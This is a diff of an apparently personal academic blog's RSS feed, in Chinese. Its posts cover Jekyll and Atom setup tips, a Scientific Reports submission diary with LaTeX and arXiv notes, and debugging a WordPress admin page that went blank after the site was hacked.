+&lt;h3 id=&#34;谷歌字体&#34;&gt;谷歌字体&lt;/h3&gt;
+
+&lt;p&gt;俺天朝跟谷歌成了死敌。背后的很多想法让人很无奈。虽然米果是两党制，但是谷歌据说也在检查之列。到了俺朝，美利坚放不下身段了，天朝也放不下，于是就僵住了。于是很多谷歌的服务都不好用了。比如谷歌学术，谷歌邮箱。哎妈呀，老伤心老。我这里要说的却是谷歌的字体格式。&lt;/p&gt;
+
+&lt;p&gt;在天朝载入我的博客慢的原因就是因为style.css里（media/css/style.css）调用里谷歌字体。好伤心，每次访问速度都很慢，非得翻墙才行。可是不能让俺的读者们也翻墙吧，这也太虎了。反正我的审美要求也没那么高。雪藏了吧。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#@import url(http://fonts.googleapis.com/css?family=Galdeano);
+#@import url(http://fonts.googleapis.com/css?family=Electrolize);
+#@import url(http://fonts.googleapis.com/css?family=Cuprum);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;改过来之后&#34;&gt;改过来之后&lt;/h3&gt;
+
+&lt;p&gt;我了个去，怎么英文字体变这么大了，BIG好吧，只能骗自己感觉萌萌哒啦。&lt;/p&gt;
+
+&lt;h3 id=&#34;把谷歌字体放在本站&#34;&gt;把谷歌字体放在本站&lt;/h3&gt;
+
+&lt;p&gt;其实很早就注意到andy wang的这个解决方法，一直比较懒。还是去在mac上安装了github for mac，于是把andy wang的media文件夹偷到我这里来用。&lt;/p&gt;
+
+&lt;p&gt;Andy Wang:
+&lt;code&gt;你好，我扒走了你的模板，然后在天朝用发现非常慢，然后调试了一下，发现是在style.css和home.css里面有从别的网站下载字体文件的, http://fonts.googleapis.com/这个网站在天朝访问非常不稳定，所以做了一些小改动，把字体文件都下载到网站上了，页面渲染速度也快了很多。https://github.com/synckey/synckey.github.io/tree/master/media/css&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;终于，世界再次变得一片清凉了。真好。&lt;/p&gt;
+
+&lt;h2 id=&#34;categories&#34;&gt;categories&lt;/h2&gt;
+
+&lt;p&gt;我喜欢在网页端更新github上的日志，通过设置只显示categories为blog的文档，我可以每次修改一点东西就完全在网页端写日志。图片附件什么的可以放在七牛网站，感觉非常好。&lt;/p&gt;
+
+&lt;p&gt;下面是我用来复制和重命名1000个md文本的python代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;        # -*- coding: utf-8 -*-
+        &amp;quot;&amp;quot;&amp;quot;
+        Created on Thu Aug 07 14:05:09 2014
+
+        @author: chengjun
+        &amp;quot;&amp;quot;&amp;quot;
+
+        import shutil
+        path = &amp;quot;D:/github/chengjun.github.io/_posts/&amp;quot;   
+
+        demo = path + &amp;quot;2010-01-01-demo.md&amp;quot;
+
+        for i in range(1000):
+            newFile = path + &amp;quot;2010-01-&amp;quot; + str(i) + &amp;quot;.md&amp;quot;
+            print newFile
+            shutil.copy(demo, newFile)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://chengjun.qiniudn.com/7.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;jekyll3-0&#34;&gt;jekyll3.0&lt;/h2&gt;
+
+&lt;p&gt;这个是一个测试，jekyll更新到了3.0版本，所以github也相应发生了改变（见&lt;a href=&#34;https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;）。这导致了我的文章无法显示，解决的方法是去掉表头的时间一行，就可以了，我还没有明白原因。&lt;/p&gt;
+
+&lt;h2 id=&#34;某一类的博文目录&#34;&gt;某一类的博文目录&lt;/h2&gt;
+
+&lt;p&gt;主要参考 &lt;a href=&#34;http://stackoverflow.com/questions/12008108/filtering-posts-using-categories-in-jekyll-bootstrap&#34; target=&#34;_blank&#34;&gt;filtering-posts-using-categories-in-jekyll-bootstrap&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这个是使用liquid写的，介绍见&lt;a href=&#34;http://liquidmarkup.org/&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;主要添加两行liquid代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if post.categories contains &#39;生活&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;不要忘记endif&lt;/p&gt;
+
+&lt;p&gt;由于liquid语言本身不能在本网站呈现，读者可以查看&lt;a href=&#34;https://github.com/chengjun/chengjun.github.io/blob/master/life/index.html&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;琢磨出一个不用每次在jekyll上写博客都要上传的方法：将要显示的博客的categories设为blog，一次上传n个草稿（不指定categories），使用liquid语言指定在博客列表中只显示blog类的。这样草稿不会被显示，每次在线登录github，更改一个草稿的标题和categories就可以了。图片用外链flickr。&lt;/p&gt;
+
+&lt;h2 id=&#34;paginator&#34;&gt;paginator&lt;/h2&gt;
+
+&lt;p&gt;今天下午鼓捣了半天jekyll的设置，最初是想弄一个&lt;a href=&#34;http://jekyllrb.com/docs/pagination/&#34; target=&#34;_blank&#34;&gt;paginator&lt;/a&gt;给文章列表分页，结果搞了半天，没搞定。各种问题。&lt;a href=&#34;http://patrick-mckinley.com/tech/jekyll-pagination.html&#34; target=&#34;_blank&#34;&gt;Patrick McKinley&lt;/a&gt;说是因为不是网站第一层的index.html，所以jekyll官方设置时没有用的。于是，直接用他的方法，发现没有办法在我的网站上实现。&lt;/p&gt;
+
+&lt;p&gt;Patrick McKinley的博客以图片来显示博客文章的方法似乎很酷。感兴趣，去研究了下他的&lt;a href=&#34;https://github.com/lilmuckers/lilmuckers.github.com&#34; target=&#34;_blank&#34;&gt;代码&lt;/a&gt;，大致是设置了post.image，图片存放在assets中的图片文件夹。我弄了下，也没弄成功。&lt;/p&gt;
+
+&lt;p&gt;又看到&lt;a href=&#34;tmtxt.github.com&#34; target=&#34;_blank&#34;&gt;Mr Trường at RMIT&lt;/a&gt;的网页，翻了半天，加了related_posts功能。&lt;/p&gt;
+
+&lt;p&gt;没想到晚上更惨，被python的encoding error搞得很头大！&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>测试Atom软件</title>
+      <link>https://chengjun.github.io/en/note/2016-05-04-atom/</link>
+      <pubDate>Wed, 04 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-05-04-atom/</guid>
+      <description>
+
+&lt;p&gt;使用&lt;strong&gt;Atom&lt;/strong&gt;来编写markdown非常不错，按ctr+shift+m就可以进入预览模式，我想markdownpad可以抛弃掉了。这个软件更流畅，非常棒！因为我经常要写github的博客，使用atom时最容易的形式。减少了甚多负担，非常的自由，如果它具有上传功能就好了。&lt;/p&gt;
+
+&lt;h1 id=&#34;数学公式&#34;&gt;数学公式&lt;/h1&gt;
+
+&lt;p&gt;安装了markdown-preview-enhanced，可以很方便的展示数学公式，比如 $x = y^2$。&lt;/p&gt;
+
+&lt;p&gt;$E = MC^2$&lt;/p&gt;
+
+&lt;p&gt;需要按 ctrl+ shift+ x，按ctrl+ shift+ m无法展示数学公式。&lt;/p&gt;
+
+&lt;h1 id=&#34;参考文献&#34;&gt;参考文献&lt;/h1&gt;
+
+&lt;p&gt;插入一个参考文献&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:a&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:a&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:b&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:b&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:c&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:c&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;再次插入一个参考文献&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:b&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:b&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;插入一个参考文献[^a][^b][^c]
+
+[^a]: author1, 2014, This is a title. Journal. 00-00
+[^b]: author2, 2014, This is a title. Journal. 00-00
+[^c]: author5, 2014, This is a title. Journal. 00-00
+
+再次插入一个参考文献[^b]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;图片上传功能&#34;&gt;图片上传功能&lt;/h1&gt;
+
+&lt;p&gt;结果就发现阿里巴巴程序员knightli的两个atom插件：qiniu-uploader和markdown-assistant。设置好七牛的账号既可以非常方便地使用图床了。赞。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/1895b6670f7276a1f10903cf1305e686.png&#34; alt=&#34;qiniu-uploader&#34; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;git上传功能&#34;&gt;Git上传功能&lt;/h1&gt;
+
+&lt;p&gt;接着又找到了&lt;a href=&#34;https://atom.io/packages/git-plus&#34; target=&#34;_blank&#34;&gt;git-plus&lt;/a&gt;这个强大的插件，可以直接在atom里上传了。好吧！社区的力量真强大。太好了。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;按 *command+shift+H*打开操作界面。&lt;/li&gt;
+&lt;li&gt;选择&lt;code&gt;add all commit+push&lt;/code&gt;就可以上传了！
+
+&lt;ul&gt;
+&lt;li&gt;填写commit的内容&lt;/li&gt;
+&lt;li&gt;command+s保存即可上传&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/7497f687c919c447882fd0abd4d68bc2.png&#34; alt=&#34;surprise&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;震惊脸！！！!&lt;/p&gt;
+
+&lt;h1 id=&#34;atom-html-preview&#34;&gt;atom-html-preview&lt;/h1&gt;
+
+&lt;p&gt;如果你需要修改的html文件的话，可以很方便地使用atom-html-preview插件。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;快捷键&lt;code&gt;ctr+shift+h&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/d832f904c15079ed7f38816a5407c1b6.png&#34; alt=&#34;atom-html-preview&#34; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;参考文献-1&#34;&gt;参考文献&lt;/h1&gt;
+&lt;div class=&#34;footnotes&#34;&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+&lt;li id=&#34;fn:a&#34;&gt;author1, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:a&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:b&#34;&gt;author2, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:b&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:c&#34;&gt;author5, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:c&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:b&#34;&gt;author2, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:b&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>语言是一道门槛</title>
+      <link>https://chengjun.github.io/en/note/2016-05-04-sr-revising/</link>
+      <pubDate>Wed, 04 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-05-04-sr-revising/</guid>
+      <description>
+
+&lt;h2 id=&#34;billing&#34;&gt;Billing&lt;/h2&gt;
+
+&lt;p&gt;Bill to&lt;/p&gt;
+
+&lt;p&gt;Cheng-Jun Wang
+wangchengjun@nju.edu.cn
++8617751010496&lt;/p&gt;
+
+&lt;h3 id=&#34;billing-method&#34;&gt;Billing method&lt;/h3&gt;
+
+&lt;p&gt;Invoice
+Billing address&lt;/p&gt;
+
+&lt;p&gt;Nanjing University
+22 Hankou Road, Gulou District, Nanjing University
+A306 Feiyimin Building, School of Journalism and Communication
+Nanjing
+China
+China
+210093&lt;/p&gt;
+
+&lt;h3 id=&#34;scientific-reports-出版业的一个新时代&#34;&gt;Scientific Reports —出版业的一个新时代&lt;/h3&gt;
+
+&lt;p&gt;Scientific Reports 是来自 Nature 杂志出版者的一个发表原始研究工作的刊物，在线出版，公开访问，内容涉及自然科学所有领域。托管在 nature.com（该网站是由Springer Nature出版的80多种刊物的共同门户，每月全球有数百万科学家访问）上， Scientific Reports 是任何人都可以公开访问的，发表在技术上可靠的、各领域内的专业人员感兴趣的原始研究论文，其相关内容的访问不受任何限制。&lt;/p&gt;
+
+&lt;p&gt;文章处理费自2015年1月起将按如下标准执行，以下费用包括增值税或其他当地税费。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;£990 (UK &amp;amp; RoW)&lt;/li&gt;
+&lt;li&gt;$1,495 (The Americas)&lt;/li&gt;
+&lt;li&gt;€1,165 (Europe)&lt;/li&gt;
+&lt;li&gt;¥170,000 (Japan)&lt;/li&gt;
+&lt;li&gt;¥9,900 (China)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Scientific Reports 是：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;快速的（Fast）—迅速审稿和发表&lt;/li&gt;
+&lt;li&gt;严格的（Rigorous）—由学术界至少一个成员来进行同行评审&lt;/li&gt;
+&lt;li&gt;公开的（Open）—文章对所有人都是免费的，作者保留版权&lt;/li&gt;
+&lt;li&gt;可见的（Visible）—增强的浏览和搜索功能，确保您的文章能够被注意到&lt;/li&gt;
+&lt;li&gt;互联的（Interlinked）—与整个 nature.com 网站上的相关文章相互之间建立链接&lt;/li&gt;
+&lt;li&gt;全球的（Global）— 托管在 nature.com 上，全球媒体覆盖&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;根据&lt;a href=&#34;http://www.docin.com/p-1309834502.html&#34; target=&#34;_blank&#34;&gt;南京大学超一流、学科群一流、SCI A 区和 B 区期刊目录&lt;/a&gt;，Scientific reports属于SCI索引期刊的A区。2016年公布的Scientific Reports 影响因子5.228*
+*2015 Journal Citation Reports® Science Edition (Thomson Reuters, 2016)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/5e1e31a8ec89e5fa3374b23baa8eadde.png&#34; alt=&#34;SR&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;南京大学关于Scientific Reports论文发表的新闻：
+&lt;a href=&#34;http://news.nju.edu.cn/searchsite.php?r=scientific%20reports&#34; target=&#34;_blank&#34;&gt;http://news.nju.edu.cn/searchsite.php?r=scientific%20reports&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;2015-11-26 Scientific Reports刊登我校博士生俞恂大陆火山成因研究新成果&lt;/li&gt;
+&lt;li&gt;2014-10-29 大气科学学院符淙斌院士团队在Scientific Reports杂志发表最新研究成果&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;8月19日&#34;&gt;8月19日&lt;/h2&gt;
+
+&lt;h3 id=&#34;hidden-direction&#34;&gt;hidden direction&lt;/h3&gt;
+
+&lt;p&gt;中间因为editor换了，又更新过一次reviewer，耽搁了时间。2015年12月10日进入decision started的状态；过了一个半月，也就是2016年1月24日到了2月2日才收到editor回复，之后又过了&lt;strong&gt;十天&lt;/strong&gt;时间收到SR的邮件。所以概括一下：这个editor的速度灰常慢，再等半个月。&lt;/p&gt;
+
+&lt;p&gt;突然发现9月2日editor提交了审稿意见，经过了一个多月终于Manuscript Submitted。一般而言进入此环节表示editor做好了决定，Finger crossed！耐心地等待下一周吧。9月5日，文章被接收。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  2nd September 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript assigned to peer-reviewer/s    26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Peer-Reviewer/s    14th June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 11th June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   11th June 16&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;二审论文提交是在6月11日（中间隔了四个月），14日送审，到7月26日审完，发给编辑做决定。编辑似乎需要一个月才愿意给决定。到本月26日，编辑就消耗了一个月了，拭目以待。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Decision Started  26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript assigned to peer-reviewer/s    26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Peer-Reviewer/s    14th June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 11th June 16&lt;br /&gt;
+Submission Not Complete 11th June 16&lt;/li&gt;
+&lt;li&gt;Manuscript Submitted  24th January 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  10th December 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript assigned to peer-reviewer/s    10th December 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Peer-Reviewer/s    17th November 15&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 30th September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Submitted  29th September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   22nd September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Quality Check Started 9th September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   29th August 15&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;tracing&#34;&gt;tracing&lt;/h3&gt;
+
+&lt;p&gt;二审8月5日提交修改版本，进入quality check环节，8月12日收到邮件说要修改格式，当晚修改完毕提交。quality check到8月18日，进入decision started环节。没有想到当天就进入了Manuscript Submitted环节。一般而言进入此环节表示editor做好了决定。果然，晚上十一点半收到了acceptance letter。&lt;/p&gt;
+
+&lt;p&gt;Current Stage:  Decision Started (1 days)&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  18th August 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  18th August 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 5th August 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   9th July 16&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  6th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  6th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 2nd June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  2nd June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Quality Check Started 29th May 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   24th May 16&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;sr的latex模板&#34;&gt;SR的LaTeX模板&lt;/h2&gt;
+
+&lt;p&gt;8月12日，SR邮件说我的reference不合规范，发现只有严格按照overleaf上的模板才能生成，索性直接使用这个模板&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.overleaf.com/5874225tbgnxc#/19389854/&#34; target=&#34;_blank&#34;&gt;https://www.overleaf.com/5874225tbgnxc#/19389854/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;点击project，点击 download as zip即可下载。&lt;/p&gt;
+
+&lt;p&gt;因为不允许上传bib和cls文件，所以每次validation的时候还可以选择自己上传一个pdf。修改时只需要删除原来的tex文件，重新上传tex，并在validation的时候重新上传一个pdf即可。&lt;/p&gt;
+
+&lt;h2 id=&#34;积极向上的心智&#34;&gt;积极向上的心智&lt;/h2&gt;
+
+&lt;p&gt;突然我挺烦“正能量”这个词，因为使用这个词的地方往往是政府缺位的地方。&lt;/p&gt;
+
+&lt;p&gt;但是对于个体而言，找到正能量确实非常有必要的。每一个人都会面对生活的各种挑战，我们无法预测未来会是怎样，上天将会如何试探我们。&lt;/p&gt;
+
+&lt;p&gt;面对生活，积极向上的精神是不可或缺的。&lt;/p&gt;
+
+&lt;p&gt;这是一种心智的力量，需要个体去修炼。禅宗讲行走坐卧皆是修行是有道理的，因为每一个细节都在锤炼着我们的意志。我喜欢心智这个词，因为当我们面对挑战的时候，仅仅强调勇气、勤奋是远远不够的。因为我们可能是那个面对风车的堂吉诃德；因为我们可能已经在错误的道路上渐行渐远。要有智慧来面对挑战。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;不仅仅是蔑视困难，而且要能积极地应对挑战。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;自强不息&#34;&gt;自强不息&lt;/h2&gt;
+
+&lt;p&gt;2016年8月3日，最近比较累。lingfei将tracing一文全面改了一遍，增加了可读性，文章的长度大幅度降低。我却变得更懒了，没有动力去修改。感觉我的个性里消极的成分太多了。&lt;/p&gt;
+
+&lt;p&gt;自强不息是一个多么艰难的目标。但是我应当牢记，这是最困难的阶段，跨过这个阶段，我要做的更好。放下那些不必要的压力，做回来自我。&lt;/p&gt;
+
+&lt;p&gt;要善于给自己鼓劲，在黑暗里看到希望的光。加油！&lt;/p&gt;
+
+&lt;h2 id=&#34;the-collective-direction-of-attention-diffusion&#34;&gt;The collective direction of attention diffusion&lt;/h2&gt;
+
+&lt;p&gt;2016年7月26日，晚上习惯性地刷了下sr，发现42天后，状态变为decision started。于是我想说要cross my fingers，没想到在西方是这样交叉手指祈祷的，姿势是把食指放在中指前面。&lt;/p&gt;
+
+&lt;p&gt;关于cross fingers的解释如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/99886fb7ed981357171ef53f332a1ac3.png&#34; alt=&#34;cross_fingers&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这一张图片更有爱！
+&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/5d47fa9f9d4e6f775c5f68aec81f7452.png&#34; alt=&#34;cross_fingers_girl&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;到现在快有一个月了，还是这个状态：没有消息就是好消息。不要杞人忧天，庸人自扰。&lt;/p&gt;
+
+&lt;h2 id=&#34;proofread&#34;&gt;Proofread&lt;/h2&gt;
+
+&lt;p&gt;We find that the flow of attention on the Web forms a directed, tree-like structure. Using the data of a news sharing website, we construct clickstream networks in which nodes are news stories and edges represent the consecutive clicks between two stories. To identify the flow direction of clickstreams, we define the “flow distance” of nodes (Li), which measures the average number of steps a random walker takes to reach the ith node. It is observed that Li is related with with the clicks (Ci) to news stories and the age (Ti) of stories. Putting these three variables together help us understand the rise and decay of news stories from a network perspective. We also find that the studied clickstream networks preserve a stale structure over time, leading to the scaling between users and clicks. The universal scaling behavior is confirmed by the data from 1,000 Web forums. We suggest that the tree-like, stable structure of clickstream networks reveals the time-sensitive preference of users in online browsing. To test our assumption, we discuss three models on individual browsing behavior, and compare the simulation results with empirical data.&lt;/p&gt;
+
+&lt;p&gt;我们发现万维网上的注意力流动构成了一个有向的树状结构。使用一个新闻分享类网站的数据，我们构造了点击流网络：节点是新闻，链接是两个新闻之间的点击流。为了确认点击流的流动方向，我们定义了节点的流距离Li：它测量了一个随机游走者需要多少步才能走到该节点。研究发现Li与新闻点击量Ci和新闻的年龄Ti有关。同时分析这三个变量可以帮助我们从一个网络的视角理解新闻的出现和消亡过程。我们也发现构造的点击流网络在不同的时间可以维持一个稳定的结构，而这个稳定的结构解释了用户和点击流之间的标度关系。1000个网络论坛的数据验证了这种普世的标度行为。我们认为点击流网络的这种树状的稳定结构表明了用户浏览行为的时间敏感性偏好。为了验证这个假设，我们讨论了三种用户浏览行为的模型，并比较了计算机模拟的结构与实证数据之间的关系。&lt;/p&gt;
+
+&lt;p&gt;念兹在兹，我手写我心真的是不容易实现的状态。语言是一道门槛，只有越过它才能更好地与人交流。&lt;/p&gt;
+
+&lt;h2 id=&#34;arxiv&#34;&gt;arxiv&lt;/h2&gt;
+
+&lt;p&gt;5月27日，我开始尝试&lt;a href=&#34;http://www.bbioo.com/people/108-480562-1.html&#34; target=&#34;_blank&#34;&gt;将bib嵌入tex的方法&lt;/a&gt;：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;正常编译tex和bib文件生成bbl文件，&lt;/li&gt;
+&lt;li&gt;复制bbl文件所有内容放进tex文件&lt;/li&gt;
+&lt;li&gt;编译一次bbl，然后一次latex，就可以显示正确了。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;其中，复制bbl文件所有内容放进tex文件的格式如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;\section*{Competing financial interests}
+The authors declare no competing financial interests.
+
+%\section*{References}
+% The bibtex filename apalike unsrt ieeetr acm alpha plain
+\bibliographystyle{unsrt}
+\begin{thebibliography}{10}
+
+\bibitem{ginsberg2009detecting}
+Jeremy Ginsberg, Matthew~H Mohebbi, Rajan~S Patel, Lynnette Brammer, Mark~S
+  Smolinski, and Larry Brilliant.
+\newblock Detecting influenza epidemics using search engine query data.
+\newblock {\em Nature}, 457(7232):1012--1014, 2009.
+
+\end{thebibliography}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后，我按这个方法将转化后的tex文件，图片文件上传到了arxiv上面。You may update your submission at: &lt;a href=&#34;https://arxiv.org/submit/1571860&#34; target=&#34;_blank&#34;&gt;https://arxiv.org/submit/1571860&lt;/a&gt; Your article is scheduled to be announced at Mon, 30 May 2016 00:00:00 GMT. 之前遇到的问题说上传的latex不符合规定，修改半天也不得要领。&lt;/p&gt;
+
+&lt;p&gt;更新arXiv的论文版本也挺方便，重新上传上述内容即可较快更新。&lt;/p&gt;
+
+&lt;h3 id=&#34;bibitem&#34;&gt;bibitem&lt;/h3&gt;
+
+&lt;p&gt;bibtex被编译之后其实是这些bibitem。它们的格式其实很简单，如果google scholar可以直接另存为bibitem就省事了。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;\bibitem{penrose2003random}
+Mathew Penrose.
+\newblock {\em Random geometric graphs}.
+\newblock Number~5. Oxford University Press, 2003.
+
+\bibitem{papadopoulos2012popularity}
+Fragkiskos Papadopoulos, Maksim Kitsak, M~{\&#39;A}ngeles Serrano, Mari{\&#39;a}n Bogun{\&#39;a}, and Dmitri Krioukov.
+\newblock Popularity versus similarity in growing networks.
+\newblock {\em Nature}, 489(7417):537--540, 2012.
+
+\bibitem{brockmann2013hidden}
+Dirk Brockmann and Dirk Helbing.
+\newblock The hidden geometry of complex, network-driven contagion phenomena.
+\newblock {\em Science}, 342(6164):1337--1342, 2013.
+
+\bibitem{eagle2010network}
+Nathan Eagle, Michael Macy, and Rob Claxton.
+\newblock Network diversity and economic development.
+\newblock {\em Science}, 328(5981):1029--1031, 2010.
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>wordpress白屏错误</title>
+      <link>https://chengjun.github.io/en/note/2016-03-19-wordpress-error/</link>
+      <pubDate>Sat, 19 Mar 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-03-19-wordpress-error/</guid>
+      <description>
+
+&lt;p&gt;wordpress登录后转至wp-admin为空白页。wordpress网站应该是被黑了，首先恶意注入代码，被我debug清理掉了，但是现在登录后却无法操作wp-admin界面，为空白页。还发现了两篇垃圾博客文章。我测试过wp-admin白屏的常见解决方案（例如themes或plugins不兼容造成），但这一次都不是。&lt;/p&gt;
+
+&lt;h2 id=&#34;debug-模式&#34;&gt;debug 模式&lt;/h2&gt;
+
+&lt;p&gt;已经使用过了debug模式，其实网站现在仍处于debug模式中，现在没有任何错误提示。最早的时候被恶意注入的代码已经被清理，但是一篇垃圾文章仍在：&lt;a href=&#34;http://computational-communication.com/topics/blog/&#34; target=&#34;_blank&#34;&gt;http://computational-communication.com/topics/blog/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;我在wp_config.php中使用的debug代码如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    /**
+ * This will log all errors notices and warnings to a file called debug.log in
+ * wp-content only when WP_DEBUG is true. if Apache does not have write permission,
+ * you may need to create the file first and set the appropriate permissions (i.e. use 666).
+ */
+
+define( &#39;WP_DEBUG&#39;, true ); // Or false
+if ( WP_DEBUG ) {
+    define( &#39;WP_DEBUG_LOG&#39;, true );
